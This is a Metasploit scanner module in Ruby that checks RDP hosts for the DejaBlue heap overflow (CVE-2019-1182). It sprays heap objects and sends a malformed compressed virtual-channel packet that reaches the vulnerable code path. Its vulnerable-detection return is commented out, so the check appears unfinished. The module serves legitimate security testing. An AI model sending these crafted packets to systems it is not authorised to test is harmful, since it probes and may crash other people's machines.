##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::RDP
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'CVE-2019-1182 DejaBlue Microsoft Remote Desktop RCE Check',
      'Description'    => %q{
        This module checks a range of hosts for the CVE-2019-1182 vulnerability.
      },
      'Author'         =>
        [
          'MalwareTech',      # vulnerability research
          'Spencer McIntyre', # module
        ],
      'References'     =>
        [
          [ 'CVE', '2019-1182' ],
          [ 'URL', 'https://www.malwaretech.com/2019/08/dejablue-analyzing-a-rdp-heap-overflow.html' ]
        ],
      'DisclosureDate' => '2019-08-13',
      'License'        => MSF_LICENSE,
      'Notes'          =>
        {
          'Stability' => [ CRASH_SAFE ],
          'AKA'       => ['DejaBlue']
        }
    ))
  end

  def report_goods
    report_vuln(
      :host  => rhost,
      :port  => rport,
      :proto => 'tcp',
      :name  => self.name,
      :info  => 'Behavior indicates a missing Microsoft Windows RDP patch for CVE-2019-1182',
      :refs  => self.references
    )
  end

  def run_host(ip)
    # Allow the run command to call the check command

    status = check_host(ip)
    if status == Exploit::CheckCode::Vulnerable
      print_good(status[1].to_s)
    elsif status == Exploit::CheckCode::Unsupported  # used to display custom msg error
      status = Exploit::CheckCode::Safe
      print_status("The target service is not running or refused our connection.")
    else
      print_status(status[1].to_s)
    end

    status
  end

  def rdp_reachable
    connect
    disconnect
    return true
  rescue Rex::ConnectionRefused
    return false
  rescue Rex::ConnectionTimeout
    return false
  end

  def check_host(_ip)
    # The check command will call this method instead of run_host
    status = Exploit::CheckCode::Unknown

    begin
      begin
        rdp_connect
      rescue ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError
        return Exploit::CheckCode::Unsupported # used to display custom msg error
      end

      status = check_rdp_vuln
    rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError, ::TypeError => e
      bt = e.backtrace.join("\n")
      vprint_error("Unexpected error: #{e.message}")
      vprint_line(bt)
      elog("#{e.message}\n#{bt}")
    rescue RdpCommunicationError
      vprint_error("Error communicating RDP protocol.")
      status = Exploit::CheckCode::Unknown
    rescue Errno::ECONNRESET
      vprint_error("Connection reset")
    rescue => e
      bt = e.backtrace.join("\n")
      vprint_error("Unexpected error: #{e.message}")
      vprint_line(bt)
      elog("#{e.message}\n#{bt}")
    ensure
      rdp_disconnect
    end

    status
  end

  def create_heap_objects
    # open a dvc to create a heap object
    150.times do |_|
      payload = build_virtual_channel_pdu(0x03, "\x10\x03#{ Rex::Text.rand_text_alpha_lower(7) }\x00")
      resp = rdp_send(rdp_build_pkt(payload, 'drdynvc'))

      sleep(0.1)
    end
  end

  # see [MS-RDPEGFX] section 2.2.5.2
  def build_rdp_data_segment(data)
    # RDP_DATA_SEGMENT
    encoded = [data.length].pack("L<")
    encoded << "\x04"
    encoded << data
  end

  def check_for_patch
    #begin
    #  while true do
    #    _res = rdp_recv(-1, 10)
    #  end
    #rescue RdpCommunicationError
    #  # we don't care
    #end

    # Send: DVC Capabilities Request
    payload = build_virtual_channel_pdu(0x03, "\x50" + "\x00" + "\x03\x00" + "\x33\x33" + "\x11\x11" + "\x3d\x0a" + "\xa7\x04")
    rdp_send(rdp_build_pkt(payload, 'drdynvc'))

    create_heap_objects

    # see [MS-RDPEGFX] section 2.2.5
    rdp_data_segment = build_rdp_data_segment(("\x41" * 0x40) + ("\x42" * 0x40) + ("\x43" * 0x80) + ("\x00" * (0x200 - 0x100)))
    rdp_segmented_data = [0xe1, 1, 1 - 0x2000].pack("CS<l<") + rdp_data_segment
    print_status('=== Sending second packet ===')

    # see [MS-RDPEDYC]:25 (DYNVC_DATA_COMPRESSED)
    # 0b0111 - cmd  (0x07 data compressed)
    # 0b00   - cbid (0x00 channel is field is 1 byte)
    # 0b00   - sp   (0x00 unused, should be 0x00)
    channel_id = 0x0b
    payload = build_virtual_channel_pdu(0x03, [0b0111_00_00, channel_id].pack("CC") + rdp_segmented_data)
    resp = rdp_send(rdp_build_pkt(payload, 'drdynvc'))
    #print_status("+++ Resp length: #{resp.length}")


    # close channel
    #channel_id = 0x0c
    #payload = build_virtual_channel_pdu(0x03, [0b0100_00_00, channel_id].pack("CC"))
    #resp = rdp_send(rdp_build_pkt(payload, 'drdynvc'))


    #print_status('Entering the dispatch loop')
    #rdp_dispatch_loop
    #return Exploit::CheckCode::Vulnerable if @found

    print_status('sleeping to hold the socket open')
    sleep(20) # need to keep the socket open
    print_status('exiting')
  end

  def rdp_on_channel_receive(pkt, chan_user_id, chan_id, flags, data)
    return super unless chan_id == 1003
    return super unless data[-8].unpack('C')[0] == 47
    return super unless data[-4..-1].unpack('L')[0] == 0x1133  # ERRINFO_VCDECODINGERROR

    rdp_disconnect
    @found = true
  end

  def check_rdp_vuln
    # check if rdp is open
    is_rdp, server_selected_proto = rdp_check_protocol
    unless is_rdp
      vprint_status "Could not connect to RDP service."
      return Exploit::CheckCode::Unknown
    end

    if [RDPConstants::PROTOCOL_HYBRID, RDPConstants::PROTOCOL_HYBRID_EX].include? server_selected_proto
      vprint_status("Server requires NLA (CredSSP) security which mitigates this vulnerability.")
      return Exploit::CheckCode::Safe
    end

    channels = [
      {
        :name => 'cliprdr',
        :options => RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP | RDPConstants::CHAN_COMPRESS_RDP | RDPConstants::CHAN_SHOW_PROTOCOL,
      },
      { :name => 'drdynvc',
        :options => RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP,
      },
      { :name => 'rdpsnd',
        :options => RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP,
      },
      { :name => 'snddbg',
        :options => RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP,
      },
      { :name => 'rdpdr',
        :options => RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_COMPRESS_RDP,
      },
    ]

    success = rdp_negotiate_security(channels, server_selected_proto)
    return Exploit::CheckCode::Unknown unless success

    rdp_establish_session

    result = check_for_patch

    if result == Exploit::CheckCode::Vulnerable
      report_goods
    end

    # Can't determine, but at least we know the service is running
    result
  end

end
